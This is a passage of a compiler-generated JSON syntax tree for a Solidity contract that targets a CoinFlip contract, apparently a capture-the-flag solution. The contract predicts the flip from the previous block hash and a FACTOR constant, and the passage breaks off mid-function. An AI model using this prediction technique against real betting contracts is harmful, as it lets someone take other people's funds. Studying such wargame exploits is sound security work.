                    "nodeType": "ElementaryTypeName",
                    "src": "417:7:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 37,
                  "mutability": "mutable",
                  "name": "FACTOR",
                  "nameLocation": "448:6:1",
                  "nodeType": "VariableDeclaration",
                  "scope": 175,
                  "src": "440:103:1",
                  "stateVariable": true,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 35,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "440:7:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": {
                    "hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
                    "id": 36,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": true,
                    "kind": "number",
                    "lValueRequested": false,
                    "nodeType": "Literal",
                    "src": "466:77:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
                      "typeString": "int_const 5789...(69 digits omitted)...9968"
                    },
                    "value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 43,
                  "mutability": "mutable",
                  "name": "coinFlipContract",
                  "nameLocation": "561:16:1",
                  "nodeType": "VariableDeclaration",
                  "scope": 175,
                  "src": "552:89:1",
                  "stateVariable": true,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_contract$_CoinFlip_$16",
                    "typeString": "contract CoinFlip"
                  },
                  "typeName": {
                    "id": 39,
                    "nodeType": "UserDefinedTypeName",
                    "pathNode": {
                      "id": 38,
                      "name": "CoinFlip",
                      "nodeType": "IdentifierPath",
                      "referencedDeclaration": 16,
                      "src": "552:8:1"
                    },
                    "referencedDeclaration": 16,
                    "src": "552:8:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_CoinFlip_$16",
                      "typeString": "contract CoinFlip"
                    }
                  },
                  "value": {
                    "arguments": [
                      {
                        "hexValue": "307834644633323538343839304130303236653536663735333564306632433634383637353336323466",
                        "id": 41,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "598:42:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "value": "0x4dF32584890A0026e56f7535d0f2C6486753624f"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      ],
                      "id": 40,
                      "name": "CoinFlip",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 16,
                      "src": "589:8:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_type$_t_contract$_CoinFlip_$16_$",
                        "typeString": "type(contract CoinFlip)"
                      }
                    },
                    "id": 42,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": true,
                    "kind": "typeConversion",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "589:52:1",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_CoinFlip_$16",
                      "typeString": "contract CoinFlip"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "body": {
                    "id": 173,
                    "nodeType": "Block",
                    "src": "808:2191:1",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307837363835306632613431656161343233343838313264366435663164363639613764666231316534343536623266623161643265623132343236316533623832",
                              "id": 50,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "822:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_53608011457895745557045646873884497109264415398651097390261358167252180810626_by_1",
                                "typeString": "int_const 5360...(69 digits omitted)...0626"
                              },
                              "value": "0x76850f2a41eaa42348812d6d5f1d669a7dfb11e4456b2fb1ad2eb124261e3b82"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_53608011457895745557045646873884497109264415398651097390261358167252180810626_by_1",
                                "typeString": "int_const 5360...(69 digits omitted)...0626"
                              }
                            ],
                            "id": 49,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "809:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 51,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "809:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 52,
                        "nodeType": "ExpressionStatement",
                        "src": "809:80:1"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307837353166313465363663336237316563646133663732623834656265633861633233373266393362633238313737336439336231663830343665346330386366",
                              "id": 54,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "922:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_52975519790363148372990006772522391519356875625939535245829628905303581657295_by_1",
                                "typeString": "int_const 5297...(69 digits omitted)...7295"
                              },
                              "value": "0x751f14e66c3b71ecda3f72b84ebec8ac2372f93bc281773d93b1f8046e4c08cf"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_52975519790363148372990006772522391519356875625939535245829628905303581657295_by_1",
                                "typeString": "int_const 5297...(69 digits omitted)...7295"
                              }
                            ],
                            "id": 53,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "909:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 55,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "909:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 56,
                        "nodeType": "ExpressionStatement",
                        "src": "909:80:1"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307838643532316438623239643266376531323030376464633438356534616235623539306339623865353231373431343936313631663432656337303535316662",
                              "id": 58,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "1024:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_63921197012033623210453725609799228681462944082527437509339363717959198790139_by_1",
                                "typeString": "int_const 6392...(69 digits omitted)...0139"
                              },
                              "value": "0x8d521d8b29d2f7e12007ddc485e4ab5b590c9b8e521741496161f42ec70551fb"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_63921197012033623210453725609799228681462944082527437509339363717959198790139_by_1",
                                "typeString": "int_const 6392...(69 digits omitted)...0139"
                              }
                            ],
                            "id": 57,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "1011:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 59,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1011:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 60,
                        "nodeType": "ExpressionStatement",
                        "src": "1011:80:1"
                      },
                      {
                        "assignments": [
                          62
                        ],
                        "declarations": [
                          {
                            "constant": false,
                            "id": 62,
                            "mutability": "mutable",
                            "name": "blockValue",
                            "nameLocation": "1118:10:1",
                            "nodeType": "VariableDeclaration",
                            "scope": 173,
                            "src": "1110:18:1",
                            "stateVariable": false,
                            "storageLocation": "default",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            },
                            "typeName": {
                              "id": 61,
                              "name": "uint256",
                              "nodeType": "ElementaryTypeName",
                              "src": "1110:7:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "visibility": "internal"
                          }
                        ],
                        "id": 72,
                        "initialValue": {
                          "arguments": [
                            {
                              "arguments": [
                                {
                                  "commonType": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  },
                                  "id": 69,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "leftExpression": {
                                    "expression": {
                                      "id": 66,
                                      "name": "block",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": -4,
                                      "src": "1149:5:1",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_magic_block",
                                        "typeString": "block"
                                      }
                                    },
                                    "id": 67,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": false,
                                    "lValueRequested": false,
                                    "memberName": "number",
                                    "nodeType": "MemberAccess",
                                    "src": "1149:12:1",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  },
                                  "nodeType": "BinaryOperation",
                                  "operator": "-",
                                  "rightExpression": {
                                    "hexValue": "31",
                                    "id": 68,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "1164:1:1",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_1_by_1",
                                      "typeString": "int_const 1"
                                    },
                                    "value": "1"
                                  },
                                  "src": "1149:16:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                ],
                                "id": 65,
                                "name": "blockhash",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -5,
                                "src": "1139:9:1",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
                                  "typeString": "function (uint256) view returns (bytes32)"
                                }
                              },
                              "id": 70,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "functionCall",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "1139:27:1",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_bytes32",
                                "typeString": "bytes32"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_bytes32",
                                "typeString": "bytes32"
                              }
                            ],
                            "id": 64,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "1131:7:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_uint256_$",
                              "typeString": "type(uint256)"
                            },
                            "typeName": {
                              "id": 63,
                              "name": "uint256",
                              "nodeType": "ElementaryTypeName",
                              "src": "1131:7:1",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 71,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1131:36:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "VariableDeclarationStatement",
                        "src": "1110:57:1"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307836363230363063643933646234366230613738373061616437363432393265386438656666333666373037636365373966323262353038646163333539336634",
                              "id": 74,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "1185:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_46193117771575550416962490046779601465852940910340812153100467285122904069108_by_1",
                                "typeString": "int_const 4619...(69 digits omitted)...9108"
                              },
                              "value": "0x662060cd93db46b0a7870aad764292e8d8eff36f707cce79f22b508dac3593f4"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_46193117771575550416962490046779601465852940910340812153100467285122904069108_by_1",
                                "typeString": "int_const 4619...(69 digits omitted)...9108"
                              }
                            ],
                            "id": 73,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "1172:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 75,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1172:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 76,
                        "nodeType": "ExpressionStatement",
                        "src": "1172:80:1"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307833306638626232346334626365366130353766653333636532336438626665366463626639643164386336636536313466346237643731633139613538633539",
                              "id": 78,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "1287:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_22150486421905674291982844425313455207309255596949814860096326002468127607897_by_1",
                                "typeString": "int_const 2215...(69 digits omitted)...7897"
                              },
                              "value": "0x30f8bb24c4bce6a057fe33ce23d8bfe6dcbf9d1d8c6ce614f4b7d71c19a58c59"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_22150486421905674291982844425313455207309255596949814860096326002468127607897_by_1",
                                "typeString": "int_const 2215...(69 digits omitted)...7897"
                              }
                            ],
                            "id": 77,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "1274:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 79,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1274:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 80,
                        "nodeType": "ExpressionStatement",
                        "src": "1274:80:1"
                      },
                      {
                        "condition": {
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 83,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "id": 81,
                            "name": "lastHash",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 34,
                            "src": "1377:8:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "==",
                          "rightExpression": {
                            "id": 82,
                            "name": "blockValue",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 62,
                            "src": "1389:10:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "1377:22:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "falseBody": {
                          "id": 104,
                          "nodeType": "Block",
                          "src": "1730:99:1",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "hexValue": "307863656262316632333432336438363030333961626664643664653465613963643532366636346561653663376132636134333635326132386465636231353233",
                                    "id": 101,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "1745:66:1",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_93507062113977238258022619793428353040512760251241225434053217532835632190755_by_1",
                                      "typeString": "int_const 9350...(69 digits omitted)...0755"
                                    },
                                    "value": "0xcebb1f23423d860039abfdd6de4ea9cd526f64eae6c7a2ca43652a28decb1523"
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_rational_93507062113977238258022619793428353040512760251241225434053217532835632190755_by_1",
                                      "typeString": "int_const 9350...(69 digits omitted)...0755"
                                    }
                                  ],
                                  "id": 100,
                                  "name": "c_0xcd8256e5",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 32,
                                  "src": "1732:12:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                                    "typeString": "function (bytes32) pure"
                                  }
                                },
                                "id": 102,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "1732:80:1",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 103,
                              "nodeType": "ExpressionStatement",
                              "src": "1732:80:1"
                            }
                          ]
                        },
                        "id": 105,
                        "nodeType": "IfStatement",
                        "src": "1373:456:1",
                        "trueBody": {
                          "id": 99,
                          "nodeType": "Block",
                          "src": "1401:324:1",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "hexValue": "307838303136376434626538353763326533636534666263636564666362313861663734333462333061363130373835306162376266313736623136623866336565",
                                    "id": 85,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "1415:66:1",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_57935780018841125590976165357017823721155992994080976584328630259160224166894_by_1",
                                      "typeString": "int_const 5793...(69 digits omitted)...6894"
                                    },
                                    "value": "0x80167d4be857c2e3ce4fbccedfcb18af7434b30a6107850ab7bf176b16b8f3ee"
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_rational_57935780018841125590976165357017823721155992994080976584328630259160224166894_by_1",
                                      "typeString": "int_const 5793...(69 digits omitted)...6894"
                                    }
                                  ],
                                  "id": 84,
                                  "name": "c_0xcd8256e5",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 32,
                                  "src": "1402:12:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                                    "typeString": "function (bytes32) pure"
                                  }
                                },
                                "id": 86,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "1402:80:1",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 87,
                              "nodeType": "ExpressionStatement",
                              "src": "1402:80:1"
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "hexValue": "307866383661393930663264346534396138363630386234373830366433373063303666393436613261373139313163613835373062363461643032323238343239",
                                    "id": 89,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "1513:66:1",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_112361928613878090846524321562256308291097307112516965504398617865349243241513_by_1",
                                      "typeString": "int_const 1123...(70 digits omitted)...1513"
                                    },
                                    "value": "0xf86a990f2d4e49a86608b47806d370c06f946a2a71911ca8570b64ad02228429"
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_rational_112361928613878090846524321562256308291097307112516965504398617865349243241513_by_1",
                                      "typeString": "int_const 1123...(70 digits omitted)...1513"
                                    }
                                  ],
                                  "id": 88,
                                  "name": "c_0xcd8256e5",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 32,
                                  "src": "1500:12:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                                    "typeString": "function (bytes32) pure"
                                  }
                                },
                                "id": 90,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "1500:80:1",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 91,
                              "nodeType": "ExpressionStatement",
                              "src": "1500:80:1"
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "hexValue": "307835303863376563646262356338396533333937306230303731376666336262656331653864383563386661363565653235633962633434316666613261656163",
                                    "id": 93,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "1619:66:1",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_36433261642290513976587137479061271233770421843368827397377359742813820071596_by_1",
                                      "typeString": "int_const 3643...(69 digits omitted)...1596"
                                    },
                                    "value": "0x508c7ecdbb5c89e33970b00717ff3bbec1e8d85c8fa65ee25c9bc441ffa2aeac"
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_rational_36433261642290513976587137479061271233770421843368827397377359742813820071596_by_1",
                                      "typeString": "int_const 3643...(69 digits omitted)...1596"
                                    }
                                  ],
                                  "id": 92,
                                  "name": "c_0xcd8256e5",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 32,
                                  "src": "1606:12:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                                    "typeString": "function (bytes32) pure"
                                  }
                                },
                                "id": 94,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "1606:80:1",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 95,
                              "nodeType": "ExpressionStatement",
                              "src": "1606:80:1"
                            },
                            {
                              "expression": {
                                "arguments": [],
                                "expression": {
                                  "argumentTypes": [],
                                  "id": 96,
                                  "name": "revert",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [
                                    -19,
                                    -19
                                  ],
                                  "referencedDeclaration": -19,
                                  "src": "1705:6:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_revert_pure$__$returns$__$",
                                    "typeString": "function () pure"
                                  }
                                },
                                "id": 97,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "1705:8:1",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 98,
                              "nodeType": "ExpressionStatement",
                              "src": "1705:8:1"
                            }
                          ]
                        }
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307864323836353066666632343032623336336161303335353437363961376632313737343938346662303431343164393663383361663836623233303561326238",
                              "id": 107,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "1846:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_95223014749172360522523254021059594492912943673135045206145125084721798554296_by_1",
                                "typeString": "int_const 9522...(69 digits omitted)...4296"
                              },
                              "value": "0xd28650fff2402b363aa03554769a7f21774984fb04141d96c83af86b2305a2b8"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_95223014749172360522523254021059594492912943673135045206145125084721798554296_by_1",
                                "typeString": "int_const 9522...(69 digits omitted)...4296"
                              }
                            ],
                            "id": 106,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "1833:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 108,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1833:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 109,
                        "nodeType": "ExpressionStatement",
                        "src": "1833:80:1"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307864643533383032613638343635326536666634376565633139326434346534353964333761643935653163383034303061303939663838626237326461306161",
                              "id": 111,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "1948:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_100108672410110034824547284602793623720268847568895291625263252870379089010858_by_1",
                                "typeString": "int_const 1001...(70 digits omitted)...0858"
                              },
                              "value": "0xdd53802a684652e6ff47eec192d44e459d37ad95e1c80400a099f88bb72da0aa"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_100108672410110034824547284602793623720268847568895291625263252870379089010858_by_1",
                                "typeString": "int_const 1001...(70 digits omitted)...0858"
                              }
                            ],
                            "id": 110,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "1935:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 112,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1935:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 113,
                        "nodeType": "ExpressionStatement",
                        "src": "1935:80:1"
                      },
                      {
                        "expression": {
                          "id": 116,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "id": 114,
                            "name": "lastHash",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 34,
                            "src": "2034:8:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "=",
                          "rightHandSide": {
                            "id": 115,
                            "name": "blockValue",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 62,
                            "src": "2045:10:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "2034:21:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "id": 117,
                        "nodeType": "ExpressionStatement",
                        "src": "2034:21:1"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307834663463323735363662666638623235663765613934653331373531643930616330383763633437656230386465656230303132343163666434386239343830",
                              "id": 119,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "2071:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_35867266913037679824268324462798464316439840705027564669913864152039809586304_by_1",
                                "typeString": "int_const 3586...(69 digits omitted)...6304"
                              },
